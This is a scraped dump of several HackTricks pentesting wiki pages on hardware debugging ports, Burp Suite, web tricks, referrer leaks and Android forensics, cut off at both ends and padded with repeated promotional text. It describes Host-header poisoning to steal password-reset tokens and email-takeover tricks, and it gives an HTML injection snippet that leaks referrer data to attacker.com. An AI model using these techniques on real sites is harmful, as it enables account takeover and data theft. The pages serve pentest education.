        "text": "Pentesting DNS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nResearch more about attacks to DNS\nDNSSEC and DNSSEC3\nDNS in IPv6\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nMISC\nNext\n- TODO\nHardware Hacking\nLast modified\n6mo ago"
    },
    {
        "title": "Hardware Hacking",
        "url": "https://book.hacktricks.xyz/todo/hardware-hacking",
        "text": "Hardware Hacking\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nJTAG\nJTAG allows to perform a boundary scan. The boundary scan analyzes certain circuitry, including embedded boundary-scan cells and registers for each pin.\nThe JTAG standard defines\nspecific commands for conducting boundary scans\n, including the following:\nBYPASS\nallows you to test a specific chip without the overhead of passing through other chips.\nSAMPLE/PRELOAD\ntakes a sample of the data entering and leaving the device when it‚Äôs in its normal functioning mode.\nEXTEST\nsets and reads pin states.\nIt can also support other commands such as:\nIDCODE\nfor identifying a device\nINTEST\nfor the internal testing of the device\nYou might come across these instructions when you use a tool like the JTAGulator.\nThe Test Access Port\nBoundary scans include tests of the four-wire\nTest Access Port (TAP)\n, a general-purpose port that provides\naccess to the JTAG test support\nfunctions built into a component. TAP uses the following five signals:\nTest clock input (\nTCK\n) The TCK is the\nclock\nthat defines how often the TAP controller will take a single action (in other words, jump to the next state in the state machine).\nTest mode select (\nTMS\n) input TMS controls the\nfinite state machine\n. On each beat of the clock, the device‚Äôs JTAG TAP controller checks the voltage on the TMS pin. If the voltage is below a certain threshold, the signal is considered low and interpreted as 0, whereas if the voltage is above a certain threshold, the signal is considered high and interpreted as 1.\nTest data input (\nTDI\n) TDI is the pin that sends\ndata into the chip through the scan cells\n. Each vendor is responsible for defining the communication protocol over this pin, because JTAG doesn‚Äôt define this.\nTest data output (\nTDO\n) TDO is the pin that sends\ndata out of the chip\n.\nTest reset (\nTRST\n) input The optional TRST resets the finite state machine\nto a known good state\n. Alternatively, if the TMS is held at 1 for five consecutive clock cycles, it invokes a reset, the same way the TRST pin would, which is why TRST is optional.\nSometimes you will be able to find those pins marked in the PCB. In other occasions you might need to\nfind them\n.\nIdentifying JTAG pins\nThe fastest but most expensive way to detect JTAG ports is by using the\nJTAGulator\n, a device created specifically for this purpose (although it can\nalso detect UART pinouts\n).\nIt has\n24 channels\nyou can connect to the boards pins. Then it performs a\nBF attack\nof all the possible combinations sending\nIDCODE\nand\nBYPASS\nboundary scan commands. If it receives a response, it displays the channel corresponding to each JTAG signal\nA cheaper but much slower way of identifying JTAG pinouts is by using the\nJTAGenum\nloaded on an Arduino-compatible microcontroller.\nUsing\nJTAGenum\n, you‚Äôd first\ndefine the pins of the probing\ndevice that you‚Äôll use for the enumeration.You‚Äôd have to reference the device‚Äôs pinout diagram, and then connect these pins with the test points on your target device.\nA\nthird way\nto identify JTAG pins is by\ninspecting the PCB\nfor one of the pinouts. In some cases, PCBs might conveniently provide the\nTag-Connect interface\n, which is a clear indication that the board has a JTAG connector, too. You can see what that interface looks like at\nhttps://www.tag-connect.com/info/\n. Additionally, inspecting the\ndatasheets of the chipsets on the PCB\nmight reveal pinout diagrams that point to JTAG interfaces.\nSDW\nSWD is an ARM-specific protocol designed for debugging.\nThe SWD interface requires\ntwo pins\n: a bidirectional\nSWDIO\nsignal, which is the equivalent of JTAG‚Äôs\nTDI and TDO pins and a clock\n, and\nSWCLK\n, which is the equivalent of\nTCK\nin JTAG. Many devices support the\nSerial Wire or JTAG Debug Port (SWJ-DP)\n, a combined JTAG and SWD interface that enables you to connect either a SWD or JTAG probe to the target.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nPentesting DNS\nNext\nI2C\nLast modified\n6mo ago"
    },
    {
        "title": "Radio Hacking",
        "url": "https://book.hacktricks.xyz/todo/radio-hacking",
        "text": "Radio Hacking\n‚Äã\n‚òÅ\u0000\u0000Ô∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSPI\nNext\nPentesting RFID\nLast modified\n6mo ago"
    },
    {
        "title": "Burp Suite",
        "url": "https://book.hacktricks.xyz/todo/burp-suite",
        "text": "Burp Suite\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Payloads\nSimple List:\nJust a list containing an entry in each line\nRuntime File:\nA list read in runtime (not loaded in memory). For supporting big lists.\nCase Modification:\nApply some changes to a list of strings(No change, to lower, to UPPER, to Proper name - First capitalized and the rest to lower-, to Proper Name -First capitalized an the rest remains the same-.\nNumbers:\nGenerate numbers from X to Y using Z step or randomly.\nBrute Forcer:\nCharacter set, min & max length.\n‚Äã\nhttps://github.com/0xC01DF00D/Collabfiltrator\n: Payload to execute commands and grab the output via DNS requests to burpcollab.\nBurp Suite‚Ää‚Äî‚ÄäExporter (Extensi√≥n)\nMedium\n‚Äã\nhttps://github.com/h3xstream/http-script-generator\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPentesting BLE - Bluetooth Low Energy\nNext\n- TODO\nOther Web Tricks\nLast modified\n6mo ago"
    },
    {
        "title": "Other Web Tricks",
        "url": "https://book.hacktricks.xyz/todo/other-web-tricks",
        "text": "Other Web Tricks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHost header\nSeveral times the back-end trust the\nHost header\nto perform some actions. For example, it could use its value as the\ndomain to send a password reset\n. So when you receive an email with a link to reset your password, the domain being used is the one you put in the Host header.Then, you can request the password reset of other users and change the domain to one controlled by you to steal their password reset codes.\nWriteUp\n.\nNote that it's possible that you don't even need to wait for the user to click on the reset password link to get the token, as maybe even\nspam filters or other intermediary devices/bots will click on it to analyze it\n.\nSession booleans\nSome times when you complete some verification correctly the back-end will\njust add a boolean with the value \"True\" to a security attribute your session\n. Then, a different endpoint will know if you successfully passed that check.\nHowever, if you\npass the check\nand your sessions is granted that \"True\" value in the security attribute, you can try to\naccess other resources\nthat\ndepends on the same attribute\nbut that you\nshouldn't have permissions\nto access.\nWriteUp\n.\nRegister functionality\nTry to register as an already existent user. Try also using equivalent characters (dots, lots of spaces and Unicode).\nTakeover emails\nRegister an email, before confirming it change the email, then, if the new confirmation email is sent to the first registered email,you can takeover any email. Or if you can enable the second email confirming the firt one, you can also takeover any account.\nAccess Internal servicedesk of companies using atlassian\nJira Service Management\nTRACE method\nDevelopers might forget to disable various debugging options in the production environment. For example, the HTTP\nTRACE\nmethod is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the\nTRACE\nmethod by echoing in the response the exact request that was received. This behaviour is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.\n‚Äã\nImage for post\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nBurp Suite\nNext\n- TODO\nInteresting HTTP\nLast modified\n5mo ago"
    },
    {
        "title": "Interesting HTTP",
        "url": "https://book.hacktricks.xyz/todo/interesting-http",
        "text": "Interesting HTTP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nReferrer headers and policy\nReferrer is the header used by browsers to indicate which was the previous page visited.\nSensitive information leaked\nIf at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.\nMitigation\nYou can make the browser follow a\nReferrer-policy\nthat could\navoid\nthe sensitive information to be sent to other web applications:\nReferrer-Policy: no-referrer\nReferrer-Policy: no-referrer-when-downgrade\nReferrer-Policy: origin\nReferrer-Policy: origin-when-cross-origin\nReferrer-Policy: same-origin\nReferrer-Policy: strict-origin\nReferrer-Policy: strict-origin-when-cross-origin\nReferrer-Policy: unsafe-url\nCounter-Mitigation\nYou can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):\n<\nmeta\nname\n=\n\"\nreferrer\n\"\ncontent\n=\n\"\nunsafe-url\n\"\n>\n<\nimg\nsrc\n=\n\"\nhttps://attacker.com\n\"\n>\nDefense\nNever put any sensitive data inside GET parameters or paths in the URL.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nOther Web Tricks\nNext\n- TODO\nEmails Vulnerabilities\nLast modified\n6mo ago"
    },
    {
        "title": "Emails Vulnerabilities",
        "url": "https://book.hacktricks.xyz/todo/emails-vulns",
        "text": "Emails Vulnerabilities\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nInteresting HTTP\nNext\n- TODO\nAndroid Forensics\nLast modified\n6mo ago"
    },
    {
        "title": "Android Forensics",
        "url": "https://book.hacktricks.xyz/todo/android-forensics",
        "text": "Android Forensics\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLocked Device\nTo start extracting data from an Android device it has to be unlocked. If it's locked you can:\nCheck if the device has debugging via USB activated.\nCheck for a possible\nsmudge attack\n‚Äã\nTry with\nBrute-force\n‚Äã\nData Adquisition\nCreate an\nandroid backup using adb\nand extract it using\nAndroid Backup Extractor\n:\njava -jar abe.jar unpack file.backup file.tar\nIf root access or physical connection to JTAG interface\ncat /proc/partitions\n(search the path to the flash memory, generally the first entry is\nmmcblk0\nand corresponds to the whole flash memory).\ndf /data\n(Discover the block size of the system).\ndd if=/dev/block/mmcblk0 of=/sdcard/blk0.img bs=4096 (execute it with the information gathered from the block size).\nMemory\nUse Linux Memory Extractor (LiME) to extract the RAM information. It's a kernel extension that should be loaded via adb.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nEmails Vulnerabilities\nNext\n- TODO\nTR-069\nLast modified\n6mo ago"
    },
    {
        "title": "TR-069",
        "url": "https://book.hacktricks.xyz/todo/tr-069",
        "text": "TR-069\n‚Äã\nTODO -\nPrevious\nAndroid Forensics\nNext\n- TODO\n6881/udp - Pentesting BitTorrent"
    },
    {
        "title": "6881/udp - Pentesting BitTorrent",
        "url": "https://book.hacktricks.xyz/todo/6881-udp-pentesting-bittorrent",
        "text": "6881/udp - Pentesting BitTorrent\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nTR-069\nNext\n- TODO\nCTF Write-ups\nLast modified\n6mo ago"
    },
    {
        "title": "CTF Write-ups",
        "url": "https://book.hacktricks.xyz/todo/ctf-write-ups",
        "text": "CTF Write-ups\n‚Äã\n‚òÅ\u0000\u0000Ô∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nWrite-up factory\n- Seach engine to find write-ups (TryHackMe, HackTheBox, etc.)\n‚Äã\nCTFtime Write-ups\n- Newest write-ups added to CTF events on CTFtime\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\n6881/udp - Pentesting BitTorrent\nNext\nchallenge-0521.intigriti.io\nLast modified\n6mo ago"
    },
    {
        "title": "1911 - Pentesting fox",
        "url": "https://book.hacktricks.xyz/todo/1911-pentesting-fox",
        "text": "1911 - Pentesting fox\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nAnd more services:\nubiquiti-discover udp \"Ubiquiti Networks Device\"\ndht udp \"DHT Nodes\"\n5060 udp sip \"SIP/\"\nInfluxDB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPickle Rick\nNext\n- TODO\nOnline Platforms with API\nLast modified\n6mo ago"
    },
    {
        "title": "Online Platforms with API",
        "url": "https://book.hacktricks.xyz/todo/online-platforms-with-api",
        "text": "Online Platforms with API\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nProjectHoneypot\n‚Äã\nYou can ask if an IP is related to suspicious/malicious activities. Completely free.\n‚Äã\nBotScout\n‚Äã\nCheck if the IP address is related to a bot that register accounts. It can also check usernames and emails. Initially free.\n‚Äã\nHunter\n‚Äã\nFind and verify emails.\nSome free API requests free, for more you need to pay.\nCommercial?\n‚Äã\nAlientVault\n‚Äã\nFind Malicious activities related to IPs and Domains. Free.\n‚Äã\nClearbit\n‚Äã\nFind related personal data to a email (profiles on other platforms), domain (basic company info ,mails and people working) and companies (get company info from mail).\nYou need to pay to access all the possibilities.\nCommercial?\n‚Äã\nBuiltWith\n‚Äã\nTechnologies used by webs. Expensive...\nCommercial?\n‚Äã\nFraudguard\n‚Äã\nCheck if a host (domain or IP) is related with suspicious/malicious activities. Have some free API access.\nCommercial?\n‚Äã\nFortiGuard\n‚Äã\nCheck if a host (domain or IP) is related with suspicious/malicious activities. Have some free API access.\n‚Äã\nSpamCop\n‚Äã\nIndicates if host is related to spam activity. Have some free API access.\n‚Äã\nmywot\n‚Äã\nBased on opinions and other metrics get if a domain is related with suspicious/malicious information.\n‚Äã\nipinfo\n‚Äã\nObtains basic info from an IP address. You can test up to 100K/month.\n‚Äã\nsecuritytrails\n‚Äã\nThis platform give information about domains and IP addresses like domains inside an IP 